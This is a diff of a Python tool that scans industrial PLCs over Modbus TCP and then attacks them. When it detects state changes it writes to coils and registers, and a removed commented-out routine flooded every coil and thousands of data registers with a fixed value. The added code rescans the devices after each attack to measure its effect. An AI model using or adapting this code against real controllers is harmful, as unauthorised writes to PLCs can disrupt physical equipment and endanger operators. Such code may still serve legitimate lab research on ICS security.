@@ -18,17 +18,19 @@ scan_start_time_interval=3 #每隔2分鐘
 scan_time_sleep_second=0.05 #掃描間隔
 attack_number=6 #攻擊次數
 scan_number=5
-# attack_time_sleep_second=0.01
 coil_number=20 #y
 m_number=8200 #m
 m_number=m_number-8192
 h_number=100 #h
 d_number=10 #d
 
+attack_state=0 #是否攻擊(0為不攻擊,1為攻擊)
+
 
 
 all_plc_state=[]
 attack_all_plc_state_information=[]
+attack_after_PLC_state=[]
 
 write_log_object=write_log()
 write_log_object.delete_old_log_file()
@@ -128,13 +130,17 @@ def modbus_tcp_scan_PLC_state(ip_address,ports):
 
 def modbus_tcp_scan_PLC_state_2(ip_address,ports):
     global all_plc_state
+    global attack_state
     list_id=0
+    state=0
+    if attack_state==1:
+        state=1
     for i in range(len(all_plc_state)):
         if all_plc_state[i]['ip']==ip_address:
             list_id=i
+    modbus_tcp_client_2 = ModbusClient(ip_address,ports,auto_open=True) #UID 可能可以不用設
     while True:
-        try:
-            modbus_tcp_client_2 = ModbusClient(ip_address,ports,auto_open=True) #UID 可能可以不用設
+        try:        
             t_now_time=datetime.datetime.now()
             if t_now_time.minute%scan_start_time_interval==0 and t_now_time.second==0:
                 time.sleep(1)
@@ -150,7 +156,7 @@ def modbus_tcp_scan_PLC_state_2(ip_address,ports):
                 # temp=modbus_tcp_client_2.read_coils(0,coil_number)
                 # for i in range(coil_number):
                 #     PLC_coils_state_list.append(str(temp[i]))
-                for i in range(scan_number):
+                for i in range(scan_number-state):
                     temp=copy.deepcopy(modbus_tcp_client_2.read_coils(0,coil_number))
                 for i in range(coil_number):
                     PLC_coils_state_list.append(temp[i])
@@ -160,21 +166,21 @@ def modbus_tcp_scan_PLC_state_2(ip_address,ports):
                 # temp=modbus_tcp_client_2.read_coils(8192,m_number)
                 # for i in range(m_number):
                 #     PLC_auxiliary_relay_state_list.append(str(temp[i]))
-                for i in range(scan_number):
+                for i in range(scan_number-state):
                     temp=copy.deepcopy(modbus_tcp_client_2.read_coils(8192,m_number))
                 for i in range(m_number):
                     PLC_auxiliary_relay_state_list.append(temp[i])
                 # for i in range(0,h_number):
                 #     PLC_holding_registers_state_list.append(modbus_tcp_client_2.read_holding_registers(i))
                 #     time.sleep(scan_time_sleep_second+0.035)
-                for i in range(scan_number):
+                for i in range(scan_number-state):
                     temp=copy.deepcopy(modbus_tcp_client_2.read_holding_registers(0,h_number))
                 for i in range(h_number):
                     PLC_holding_registers_state_list.append(temp[i])
                 # for i in range(0,d_number):
                 #     PLC_discrete_inputs_state_list.append(modbus_tcp_client_2.read_discrete_inputs(i))
                 #     time.sleep(scan_time_sleep_second+0.0015)
-                for i in range(scan_number):
+                for i in range(scan_number-state):
                     temp=modbus_tcp_client_2.read_discrete_inputs(0,d_number)
                 for i in range(d_number):
                     PLC_discrete_inputs_state_list.append(temp[i])
@@ -190,41 +196,6 @@ def modbus_tcp_scan_PLC_state_2(ip_address,ports):
             # modbus_tcp_client.close()
         except KeyboardInterrupt:
             modbus_tcp_client_2.close()
-
-# def modbus_tcp_attack_function(ip_address,ports):
-#     modbus_tcp_client = ModbusClient(ip_address,ports,auto_open=True) #UID 可能可以不用設
-#     try:
-#         #write Coil 線圈
-#         print('-----attack PLC write Coil -----')
-#         for i in range(1024):
-#             for j in range(19):
-#                 modbus_tcp_client.write_single_coil(i,True)
-#                 time.sleep(0.001)
-#             print('Read Coil  '+str(i)+' is='+str(modbus_tcp_client.read_coils(i)))
-#             time.sleep(0.001)
-#         # modbus_tcp_client.close()
-#         time.sleep(10)
-#         #write M0 線圈暫存器
-#         print('-----attack PLC write M0 (Auxiliary relay) -----')
-#         for i in range(8192,15872):
-#             for j in range(19):
-#                 modbus_tcp_client.write_single_coil(i,True)
-#                 time.sleep(0.001)
-#             print('Read M'+str(i)+' is='+str(modbus_tcp_client.read_coils(i)))
-#             time.sleep(0.001)
-#         # modbus_tcp_client.close()
-#         #write D0 數據暫存器
-#         print('-----attack PLC write D0 (Data register) -----')
-#         # D_attack_Inform=['5376']
-#         for i in range(0,8000):
-#             for j in range(19):
-#                 modbus_tcp_client.write_single_register(i,5376) #5376 = 我生氣了
-#                 time.sleep(0.001)
-#             print('Read D'+str(i)+' is='+str(modbus_tcp_client.read_holding_registers(i)))
-#             time.sleep(0.001)
-#         modbus_tcp_client.close()
-#     except KeyboardInterrupt:
-#         modbus_tcp_client.close()
 
 def modbus_tcp_plc_state_is_change(list1,list2):
     tt_temp=[]
@@ -324,28 +295,77 @@ def modbus_tcp_attack_function(list,list_id):
                 t_temp_data['None']=temp[None]
                 temp_list.append(t_temp_data)
             attack_all_plc_state_information[list_id]['replay_state'].append(temp_list)
-        # #write D0 數據暫存器
-        # print('-----attack PLC write D0 (discrete_inputs) -----')
-        # if attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][2]:
-        #     temp_len=len(attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][2])
-        #     temp_list=[]
-        #     for i in range(temp_len):
-        #         t_temp=[]
-        #         t_temp_data={}
-        #         for j in range(attack_number):
-        #             if attack_all_plc_state_information[list_id]['PLC_State'][2][i]:
-        #                response_3=modbus_tcp_client.write_single_register(attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][2][i],5376) #5376 = 我生氣了 # D_attack_Inform=['5376']
-                    
-        #             # time.sleep(attack_time_sleep_second)
-        #             t_temp.append(response_3)
-        #         temp=Counter(t_temp)
-        #         t_temp_data['True']=temp[True]
-        #         t_temp_data['None']=temp[None]
-        #         temp_list.append(t_temp_data)
-        #     attack_all_plc_state_information[list_id]['replay_state'].append(temp_list)
         modbus_tcp_client.close()
     except KeyboardInterrupt:
-        modbus_tcp_client.close()            
+        modbus_tcp_client.close()  
+
+
+
+
+def modbus_tcp_after_attack_PLC_scan_PLC_state(ip_address,ports):
+    global all_plc_state
+    global attack_after_PLC_state
+    attack_after_PLC_state=copy.deepcopy(all_plc_state)
+    list_id=0
+    for i in range(len(attack_after_PLC_state)):
+        if attack_after_PLC_state[i]['ip']==ip_address:
+            list_id=i
+    try:
+        modbus_tcp_client_3 = ModbusClient(ip_address,ports,auto_open=True) #UID 可能可以不用設
+        PLC_state_list=[]
+        PLC_coils_state_list=[] #modbus tcp function code 1
+        PLC_auxiliary_relay_state_list=[] #modbus tcp function code 1
+        PLC_holding_registers_state_list=[] #modbus tcp function code 3
+        PLC_discrete_inputs_state_list=[]  #modbus tcp function code 2
+        print('modbus_tcp_after_attack_PLC_scan_PLC_state_start')
+
+        
+        temp=copy.deepcopy(modbus_tcp_client_3.read_coils(0,coil_number))
+        for i in range(coil_number):
+            PLC_coils_state_list.append(temp[i])
+        
+        
+        temp=copy.deepcopy(modbus_tcp_client_3.read_coils(8192,m_number))
+        for i in range(m_number):
+            PLC_auxiliary_relay_state_list.append(temp[i])
+        
+        
+        temp=copy.deepcopy(modbus_tcp_client_3.read_holding_registers(0,h_number))
+        for i in range(h_number):
+            PLC_holding_registers_state_list.append(temp[i])
+        
+        
+        temp=modbus_tcp_client_3.read_discrete_inputs(0,d_number)
+        for i in range(d_number):
+            PLC_discrete_inputs_state_list.append(temp[i])
+        PLC_state_list.append(PLC_coils_state_list)
+        PLC_state_list.append(PLC_auxiliary_relay_state_list)
+        PLC_state_list.append(PLC_holding_registers_state_list)
+        PLC_state_list.append(PLC_discrete_inputs_state_list)
+        attack_after_PLC_state[list_id]['PLC_State']=PLC_state_list
+        write_log_object.write_log_txt('modbus_tcp_after_attack_PLC_scan_PLC_state='+str(attack_after_PLC_state))
+        # print('modbus_tcp_after_attack_PLC_scan_PLC_state='+str(attack_after_PLC_state))
+        print('modbus_tcp_after_attack_PLC_scan_PLC_state_stop')
+        modbus_tcp_client_3.close()
+    except KeyboardInterrupt:
+        modbus_tcp_client_3.close()  
+
+def attack_differ_list(list1,list2):
+    list3=copy.deepcopy(list1)
+    for i in range(len(list1)):
+        for j in range(len(list1[i]['PLC_State_is_change_address'])):
+            list3[i]['PLC_State_is_change_address'][j]=[]
+            list3[i]['PLC_State'][j]=[]
+            temp = [x for x in list2[i]['PLC_State_is_change_address'][j] if x not in list1[i]['PLC_State_is_change_address'][j]]
+            # print('list3['+str(i)+']["PLC_State_is_change_address"]['+str(j)+']='+str(temp))
+            list3[i]['PLC_State_is_change_address'][j]=temp
+            if len(temp)>0:
+                for k in range(len(list2[i]['PLC_State_is_change_address'][j])):
+                    for l in range(len(temp)):
+                        if temp[l]==list2[i]['PLC_State_is_change_address'][j][k]:
+                            list3[i]['PLC_State'][j].append(list2[i]['PLC_State'][j][k])
+    # print('list3='+str(list3))
+    return list3
 print('------')
 
 #---- scan host open port------#
@@ -426,11 +446,12 @@ try:
             # write_log_object.write_log_txt('all_plc_state[0][PLC_State][0][2]'+str(all_plc_state[0]['PLC_State'][1][0]))
             write_log_object.write_log_txt('--------------')
             if old_all_plc_state!=all_plc_state:
+                attack_state=1
                 print('now_now_time='+str(now_time.minute))
                 state_is_change=modbus_tcp_plc_state_is_change(old_all_plc_state,all_plc_state)
                 write_log_object.write_log_txt('now_time='+str(now_time.minute))
-                write_log_object.write_log_txt('state_is_change'+str(state_is_change))
-                print('state_is_change'+str(state_is_change))
+                write_log_object.write_log_txt('state_is_change='+str(state_is_change))
+                # print('state_is_change='+str(state_is_change))
                 old_all_plc_state=copy.deepcopy(all_plc_state) #指複製東西，不會跟著全域一起變動
                 attack_thread_list=[]
                 for i in range(len(state_is_change)):
@@ -439,8 +460,33 @@ try:
                     thread3.start()
                 for thread_3 in attack_thread_list:  # iterates over the threads
                     thread_3.join()       # waits until the thread has finished work
-                print('attack_all_plc_state_information='+str(attack_all_plc_state_information))
+                # print('attack_all_plc_state_information='+str(attack_all_plc_state_information))
                 write_log_object.write_log_txt('attack_all_plc_state_information='+str(attack_all_plc_state_information))
+                
+                check_attack_after_thread_list=[]
+                
+                for i in range(len(old_all_plc_state)):
+                    for j in range(len(old_all_plc_state[i]['port'])):
+                        thread4=threading.Thread(target=modbus_tcp_after_attack_PLC_scan_PLC_state,args=(old_all_plc_state[i]['ip'],old_all_plc_state[i]['port'][j],))
+                        check_attack_after_thread_list.append(thread4)
+                        thread4.start()
+                for thread_4 in check_attack_after_thread_list:  # iterates over the threads
+                    thread_4.join()       # waits until the thread has finished work
+                # for i in range(len(attack_after_PLC_state)):
+                # for i in range(len(attack_after_PLC_state)):
+                attack_after_state_is_change=modbus_tcp_plc_state_is_change(old_all_plc_state,attack_after_PLC_state)
+                write_log_object.write_log_txt('attack_after_state_is_change='+str(attack_after_state_is_change))
+                # print('attack_after_state_is_change='+str(attack_after_state_is_change))
+
+                attack_after_information=attack_differ_list(state_is_change,attack_after_state_is_change)
+                print('--------------attack after PLC State ------------------------------')
+                print('attack_after_information='+str(attack_after_information))
+                write_log_object.write_log_txt('attack_after_information='+str(attack_after_information))
+                attack_state=0
+                
+
+                
+                
 
 
     # while True:
